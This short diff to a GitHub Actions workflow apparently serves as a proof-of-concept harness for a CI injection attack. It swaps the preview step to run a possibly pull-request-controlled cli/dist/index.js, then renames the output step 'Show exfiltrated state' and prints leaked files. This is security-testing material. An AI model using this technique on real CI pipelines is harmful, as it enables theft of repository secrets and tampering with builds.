@@ -67,13 +67,16 @@ jobs:
 
       - name: "Make preview"
         run: |
-          node .github/poc-preview.js $PREVIEW_DIR \
+          # models: pnpm -w preview $PREVIEW_DIR --repoFullName ... (pnpm runs
+          # the workspace `templates` bin, i.e. cli/dist/index.js)
+          node cli/dist/index.js $PREVIEW_DIR \
             --repoFullName $PR_REPOSITORY \
             --branch $PR_REF \
             --pr $PR_ID \
             --hash $PR_SHA_SHORT
         continue-on-error: true
 
-      - name: Show injected output
+      - name: Show exfiltrated state
         run: |
-          for f in leak*; do if [ -f "$f" ]; then echo "--- $f ---"; cat "$f"; fi; done
+          echo "--- cli/dist/index.js head ---"; head -3 cli/dist/index.js
+          for f in leak leak2; do if [ -f "$f" ]; then echo "--- $f ---"; cat "$f"; fi; done
